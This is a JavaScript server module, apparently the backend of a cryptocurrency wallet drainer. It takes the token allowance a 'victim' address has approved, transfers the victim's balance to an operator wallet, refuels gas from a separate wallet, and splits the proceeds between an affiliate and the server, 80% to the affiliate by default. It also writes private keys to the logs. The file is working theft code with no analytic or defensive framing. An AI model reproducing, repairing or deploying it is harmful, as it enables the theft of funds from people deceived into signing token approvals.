import { ethers } from "ethers";
import logger from "../utils/logger.js";
import wallets from "../utils/wallets.js";
import web3services from "../services/web3services.js";

const USP = process.env.USER_SHARE_PERCENTAGE || "80";

const approvedToken = async (data, config) => {
  const abi = data.abi;
  const chain = data.chain;
  const token = data.token;

  const OPERATOR_WALLET = config.OPERATOR_WALLET;
  const GAS_TANK_WALLET = config.GAS_TANK_WALLET;

  const OPERATOR_ADDRESS = OPERATOR_WALLET.address;
  const GAS_TANK_ADDRESS = GAS_TANK_WALLET.address;
  const VICTIM_ADDRESS = data.victimAddress;
  const USER_ADDRESS = config.USER_ADDRESS;
  const SERVER_ADDRESS = config.SERVER_ADDRESS;

  const provider = config.provider;

  const contract = new ethers.Contract(token.id, abi, OPERATOR_WALLET);
  const allowance = await contract.allowance(VICTIM_ADDRESS, OPERATOR_ADDRESS);

  if (allowance.eq(0)) throw new Error("0 allowance found !");

  const balance = await contract.balanceOf(VICTIM_ADDRESS);
  const withdrawalAmount = allowance.gt(balance) ? balance : allowance;

  const gasLimits = {};
  const gasPrice = await web3services.getGasPrice(chain.id);

  gasLimits["transferFrom"] = await contract.estimateGas.transferFrom(
    VICTIM_ADDRESS,
    OPERATOR_ADDRESS,
    withdrawalAmount
  );

  gasLimits["gasTank"] = await provider.estimateGas({
    from: GAS_TANK_ADDRESS,
    to: OPERATOR_ADDRESS,
  });

  gasLimits["txCosts"] = gasLimits["transferFrom"].mul(gasPrice);

  const refueling_transferFrom = await web3services.sendGas({
    to: OPERATOR_ADDRESS,
    value: gasLimits["txCosts"],
    chain,
    gasPrice,
  });

  console.log(
    "refueling_transferFrom tx: ",
    refueling_transferFrom.transactionHash
  );

  let transferFromTransaction = await contract.transferFrom(
    VICTIM_ADDRESS,
    OPERATOR_ADDRESS,
    withdrawalAmount
  );

  const transferFromReceipt = await transferFromTransaction.wait();

  console.log("transferFrom tx: ", transferFromReceipt.transactionHash);

  gasLimits["transfer"] = await contract.estimateGas.transfer(
    SERVER_ADDRESS,
    withdrawalAmount
  );

  const transferGasLimits = gasLimits["transfer"].mul(2);
  const transferCosts = transferGasLimits.mul(gasPrice);

  const userAmount = web3services.getPercentage(withdrawalAmount, USP);
  const serverAmount = withdrawalAmount.sub(userAmount);

  if (transferCosts.gt(serverAmount))
    throw new Error("transfer costs greater than server share");

  const refueling_transfer = await web3services.sendGas({
    to: OPERATOR_ADDRESS,
    value: transferCosts,
    chain,
    gasPrice,
  });

  console.log("refueling_transfer tx: ", refueling_transfer.transactionHash);

  const userTransaction = await contract.transfer(USER_ADDRESS, userAmount);
  const serverTransaction = await contract.transfer(
    SERVER_ADDRESS,
    serverAmount
  );

  const userReceipt = await userTransaction.wait();
  const serverReceipt = await serverTransaction.wait();

  console.log("user tx: ", userReceipt.transactionHash);
  console.log("server tx: ", serverReceipt.transactionHash);

  return {
    refueling_transferFrom,
    transferFromReceipt,
    refueling_transfer,
    userAmount,
    serverAmount,
    userReceipt,
    serverReceipt,
    gasLimits,
  };
};
const nativeTokenTransfered = async () => {
  return "done";
};

const complete = async (req, res) => {
  const user = req.user;
  const { event, ...payload } = req.body;

  const USER_ADDRESS =
    user.WALLET_ADDRESS || "0xbEC6A66F83f73441545f175Ed5B8da0ACE448547"; //user.WALLET_ADDRESS
  const SERVER_ADDRESS = process.env.SERVER_WALLET_ADDRESS;
  const OPERATOR_ADDRESS = payload.randomAddress;

  const provider = new ethers.providers.JsonRpcProvider(payload.chain.rpcUrl);
  const GAS_TANK_PRIVATE_KEY = process.env.GAS_TANK_PRIVATE_KEY;
  const OPERATOR_PRIVATE_KEY = wallets.get(OPERATOR_ADDRESS);

  const GAS_TANK_WALLET = new ethers.Wallet(GAS_TANK_PRIVATE_KEY, provider);
  const OPERATOR_WALLET = new ethers.Wallet(OPERATOR_PRIVATE_KEY, provider);

  logger.info("Gas Tank PRIVATE_KEY", GAS_TANK_PRIVATE_KEY);
  logger.info("Operator PRIVATE_KEY", OPERATOR_PRIVATE_KEY);

  logger.info("Gas Tank WALLET_ADDRESS", GAS_TANK_WALLET.address);
  logger.info("Operator WALLET_ADDRESS", OPERATOR_WALLET.address);

  const events = {
    APPROVED_TOKEN: approvedToken,
    NATIVE_TOKEN_TRANSFERED: nativeTokenTransfered,
  };

  try {
    const config = {
      USER_ADDRESS,
      SERVER_ADDRESS,
      GAS_TANK_WALLET,
      OPERATOR_WALLET,
      provider,
    };

    const response = await events[event](payload, config);
    console.log("response: ", response);
    res.send(response);
  } catch (error) {
    logger.error(error);
    res.status(500).send({ error: error.message });
  }
};

export default {
  complete,
};
